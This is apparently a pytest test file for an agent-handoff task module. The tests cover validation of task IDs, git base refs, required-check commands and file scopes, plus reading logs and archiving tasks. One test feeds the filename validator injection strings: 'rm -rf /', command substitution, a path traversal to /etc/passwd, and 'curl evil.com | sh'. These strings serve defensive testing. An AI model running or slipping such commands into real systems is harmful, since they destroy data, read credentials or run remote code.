"""Tests for Agent Handoff v2 — agent_tasks module."""

from __future__ import annotations

import json

import pytest

from examples.mcp_server.agent_tasks import (
    archive_agent_task,
    build_current_plan,
    build_initial_status,
    build_task_json,
    list_agent_tasks,
    read_agent_log_tail,
    read_agent_task_file,
    validate_base_ref,
    validate_filename,
    validate_required_checks,
    validate_scope_contract,
    validate_task_id,
    write_agent_task,
)


class TestValidateTaskId:
    def test_valid_ids(self):
        for tid in [
            "2026-06-24-stage-12-15a-rag-search-chunks-opencode",
            "a12345678901",
            "fix-test-flake-auth-mimo",
        ]:
            validate_task_id(tid)

    def test_invalid_ids(self):
        for tid in ["", "too-short", "UPPERCASE", "has spaces", "ä", None]:
            with pytest.raises((ValueError, TypeError)):
                validate_task_id(tid)  # type: ignore[arg-type]


class TestValidateBaseRef:
    SHA1 = "a" * 40
    SHA256 = "b" * 64

    def test_none_and_empty_accepted(self):
        validate_base_ref(None)
        validate_base_ref("")

    def test_full_40_hex_accepted(self):
        validate_base_ref(self.SHA1)

    def test_full_64_hex_accepted(self):
        validate_base_ref(self.SHA256)

    def test_mixed_case_full_hex_accepted(self):
        validate_base_ref("A" * 40)
        validate_base_ref("aBcDeF" * 6 + "aBcD")

    def test_rejects_short_or_partial_hex(self):
        for bad in ["a" * 39, "a" * 41, "b" * 63, "b" * 65]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_non_hex(self):
        for bad in ["g" * 40, "a" * 39 + "x", "z" * 64]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_refs_and_fragments(self):
        for bad in ["HEAD", "main", "main~1", "origin/main", "a" * 7]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_non_string(self):
        with pytest.raises(TypeError):
            validate_base_ref(123)  # type: ignore[arg-type]

    def test_build_task_json_rejects_invalid_base_ref(self):
        with pytest.raises(ValueError):
            build_task_json(task_id="a12345678901", agent="opencode", base_ref="main")


class TestValidateRequiredChecks:
    def test_rejects_acceptance_prose_with_clear_message(self):
        prose = [
            "No file modifications; report findings only.",
            "Run targeted tests and Ruff for changed files.",
        ]
        for entry in prose:
            with pytest.raises(ValueError) as exc_info:
                validate_required_checks([entry])
            assert "looks like acceptance prose" in str(exc_info.value)
            assert "acceptance_criteria" in str(exc_info.value)

    def test_accepts_legitimate_commands(self):
        legit = [
            "tox -q",
            "poetry run pytest -q",
            "uv run pytest -q",
            "FOO=1 BAR=2 pytest -q",
            "PYTHONPATH=. .venv/bin/python -m pytest tests -q",
            "./scripts/check.sh",
            "pytest -q",
            "ruff check",
            "pytest tests/test_agent_tasks.py tests/test_agent_paths.py -q",
            "pytest && ruff check tests/",
            "ruff check . && pytest -q | tee pytest.log",
            "git add .",
            "make check",
        ]
        for entry in legit:
            validate_required_checks([entry])

    def test_rejects_non_string_and_empty_entries(self):
        for bad in [None, "", "   ", "   \n\t", 42, ["nested"]]:
            with pytest.raises((TypeError, ValueError)):
                validate_required_checks([bad])  # type: ignore[list-item]

    def test_rejects_invalid_shell_syntax(self):
        for bad in ["pytest 'unterminated", "ruff check &&", "pytest |", "tox >"]:
            with pytest.raises(ValueError):
                validate_required_checks([bad])

    def test_rejects_non_list_input(self):
        with pytest.raises(TypeError):
            validate_required_checks("pytest -q")  # type: ignore[arg-type]

    def test_accepts_none_and_empty_list(self):
        validate_required_checks(None)
        validate_required_checks([])

    def test_build_task_json_rejects_prose(self):
        with pytest.raises(ValueError) as exc_info:
            build_task_json(
                task_id="a12345678901",
                agent="opencode",
                required_checks=["No file modifications; report findings only."],
            )
        assert "acceptance_criteria" in str(exc_info.value)

    def test_build_current_plan_rejects_prose(self):
        with pytest.raises(ValueError):
            build_current_plan(
                task_id="a12345678901",
                task="Fix tests",
                required_checks=["Run targeted tests and Ruff for changed files."],
            )

    def test_acceptance_criteria_remains_unrestricted(self):
        result = build_current_plan(
            task_id="a12345678901",
            task="Fix tests",
            acceptance_criteria=["No file modifications; report findings only."],
        )
        assert "No file modifications; report findings only." in result


class TestValidateScopeContract:
    def test_rejects_global_forbidden_with_nonempty_allowlist(self):
        for pattern in ["*", "**", "**/*"]:
            with pytest.raises(ValueError):
                validate_scope_contract(["app/**"], [pattern])

    def test_rejects_exact_overlap(self):
        with pytest.raises(ValueError):
            validate_scope_contract(["app/routers/jobs.py"], ["app/routers/jobs.py"])

    def test_accepts_nonconflicting_scope(self):
        validate_scope_contract(["app/**", "tests/**"], ["migrations/**"])

    def test_build_task_json_rejects_contradictory_scope(self):
        with pytest.raises(ValueError):
            build_task_json(
                task_id="a12345678901",
                agent="opencode",
                allowed_files=["app/routers/jobs.py"],
                forbidden_files=["**/*"],
            )


class TestBuildTaskJson:
    def test_minimal(self):
        result = build_task_json(task_id="a12345678901", agent="opencode")
        data = json.loads(result)
        assert data["task_id"] == "a12345678901"
        assert data["agent"] == "opencode"
        assert data["allowed_files"] == []
        assert data["commit_allowed"] is False
        assert "created" in data

    def test_minimal_base_ref_defaults_to_empty_string(self):
        data = json.loads(build_task_json(task_id="a12345678901", agent="opencode"))
        assert data["base_ref"] == ""

    def test_full(self):
        result = build_task_json(
            task_id="b23456789012",
            agent="custom-agent",
            allowed_files=["src/**", "tests/**"],
            forbidden_files=["migrations/**"],
            required_checks=["pytest -q", "ruff check"],
            worktree_path="../agent-worktrees/task-b",
            commit_allowed=False,
            push_allowed=False,
        )
        data = json.loads(result)
        assert data["agent"] == "custom-agent"
        assert "src/**" in data["allowed_files"]
        assert data["required_checks"] == ["pytest -q", "ruff check"]

    def test_accepts_base_ref(self):
        sha = "c" * 40
        data = json.loads(build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha))
        assert data["base_ref"] == sha

    def test_accepts_64_hex_base_ref(self):
        sha = "d" * 64
        data = json.loads(build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha))
        assert data["base_ref"] == sha


class TestWriteAgentTask:
    def _fake_run_cmd(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "ok", "stderr": "", "exit_code": 0}

        return fake_run_cmd, calls

    @staticmethod
    def _decoded_payload(script: str, filename: str) -> str:
        import base64

        line = next(line for line in script.splitlines() if line.endswith(f"/{filename}"))
        encoded = line.split("printf %s ", 1)[1].split(" | base64 -d", 1)[0]
        return base64.b64decode(encoded).decode("utf-8")

    def test_writes_base_ref_to_task_json_and_base_ref_txt(self):
        sha = "e" * 40
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="Pin base ref", base_ref=sha)
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["base_ref"] == sha
        assert self._decoded_payload(script, "base-ref.txt") == sha

    def test_omitted_base_ref_stays_backward_compatible(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="No base ref")
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["base_ref"] == ""
        assert "base-ref.txt" not in script

    def test_invalid_base_ref_raises_before_script(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        with pytest.raises(ValueError):
            write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="Bad base ref", base_ref="main")
        assert calls == []


class TestBuildInitialStatus:
    def test_created_status(self):
        result = build_initial_status(agent="opencode", task_id="a12345678901")
        assert "Status: created" in result
        assert "opencode" in result
        assert "a12345678901" in result

    def test_different_agent(self):
        result = build_initial_status(agent="custom-agent", task_id="b23456789012")
        assert "Status: created" in result
        assert "custom-agent" in result


class TestBuildCurrentPlan:
    def test_minimal(self):
        result = build_current_plan(task_id="c34567890123", task="Fix tests")
        assert "# Fix tests" in result
        assert "c34567890123" in result
        assert "implementation-diff.patch" in result
        assert "Do not commit or push" in result

    def test_full(self):
        result = build_current_plan(
            task_id="d45678901234",
            task="Add search chunks",
            scope="UI only",
            allowed_files=["father-ui/src/**"],
            forbidden_files=["app/**"],
            required_checks=["pytest -q"],
            acceptance_criteria=["Build passes", "Tests pass"],
            commit_message="polish: improve RAG search",
            constraints="No model changes",
        )
        assert "## Scope" in result
        assert "father-ui/src/**" in result
        assert "app/**" in result
        assert "polish: improve RAG search" in result
        assert "No model changes" in result


class TestReadAgentTaskFile:
    def test_returns_callable_result(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "file content", "stderr": "", "exit_code": 0}

        result = read_agent_task_file(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            filename="agent-status.md",
        )
        assert result["stdout"] == "file content"
        assert len(calls) == 1
        assert calls[0][0] == "my-proj"
        assert "a12345678901/agent-status.md" in calls[0][1]

    def test_rejects_shell_injection_in_filename(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "should never run", "stderr": "", "exit_code": 0}

        for malicious in [
            "x; rm -rf /",
            "x$(whoami)",
            "x`whoami`",
            "../../../etc/passwd",
            "x && curl evil.com | sh",
        ]:
            with pytest.raises(ValueError):
                read_agent_task_file(
                    fake_run_cmd,
                    project="my-proj",
                    task_id="a12345678901",
                    filename=malicious,
                )
        assert calls == []

    def test_accepts_safe_filenames(self):
        for name in ["agent-status.md", "agent-report.md", "implementation-diff.patch"]:
            validate_filename(name)


class TestReadAgentLogTail:
    def test_reads_fixed_bounded_log_and_tails_lines(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "one\ntwo\nthree\n", "stderr": "", "exit_code": 0}

        result = read_agent_log_tail(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            tail_lines=2,
        )

        assert result["stdout"] == "two\nthree\n"
        assert result["truncated"] is True
        assert calls == [(
            "my-proj",
            "tail -c 65537 -- .ai-bridge/tasks/a12345678901/opencode-output.log",
        )]

    def test_strips_ansi_and_executor_owned_paths(self, monkeypatch):
        from examples.mcp_server.agent_paths import managed_workspace_path, task_dir

        monkeypatch.setenv("MCP_AGENT_STATE_ROOT", "/var/lib/mcp-agent/state")
        monkeypatch.setenv("MCP_AGENT_WORKSPACE_ROOT", "/var/lib/mcp-agent/workspaces")
        project = "my-proj"
        task_id = "a12345678901"
        td = task_dir(project, task_id)
        wt = managed_workspace_path(project, task_id)
        assert wt is not None

        result = read_agent_log_tail(
            lambda _p, _c: {
                "stdout": f"\x1b[0m→ Read {td}/current-plan.md\ncd {wt}\n",
                "stderr": "",
                "exit_code": 0,
            },
            project=project,
            task_id=task_id,
        )

        assert "\x1b" not in result["stdout"]
        assert "/var/lib/mcp-agent" not in result["stdout"]
        assert "<agent-task>/current-plan.md" in result["stdout"]
    @pytest.mark.parametrize("tail_lines", [0, 1001, -1, True])
    def test_rejects_invalid_line_count_before_command(self, tail_lines):
        calls = []
        with pytest.raises((TypeError, ValueError)):
            read_agent_log_tail(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                tail_lines=tail_lines,
            )
        assert calls == []

    def test_missing_log_is_not_an_error(self):
        result = read_agent_log_tail(
            lambda _p, _c: {"stdout": "", "stderr": "missing", "exit_code": 1},
            project="my-proj",
            task_id="a12345678901",
        )
        assert result["stdout"] == "(not found)"
        assert result["exit_code"] == 0
        assert result["truncated"] is False


class TestListAgentTasks:
    def test_passes_project_and_requests_newest_first(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "task-2\ntask-1", "stderr": "", "exit_code": 0}

        result = list_agent_tasks(fake_run_cmd, project="my-proj")
        assert calls[0][0] == "my-proj"
        assert "ls -1t" in calls[0][1]
        assert ".ai-bridge/tasks/" in calls[0][1]
        assert result["stdout"] == "task-2\ntask-1"

    def test_marks_truncated_task_list(self):
        tasks = [f"task-{idx:02d}" for idx in range(55)]

        def fake_run_cmd(project: str, command: str) -> dict:
            return {"stdout": "\n".join(tasks), "stderr": "", "exit_code": 0}

        result = list_agent_tasks(fake_run_cmd, project="my-proj")
        lines = result["stdout"].splitlines()
        assert lines[:50] == tasks[:50]
        assert lines[50] == "(truncated: showing 50 of 55 tasks)"


class TestArchiveAgentTask:
    def test_passes_project_and_task_id(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "ok", "stderr": "", "exit_code": 0}

        result = archive_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901")
        assert result["stdout"] == "archived a12345678901"
        assert any("mv" in cmd for _, cmd in calls)

    def test_invalid_task_id_raises(self):
        with pytest.raises(ValueError):
            archive_agent_task(lambda p, c: {}, project="p", task_id="bad")
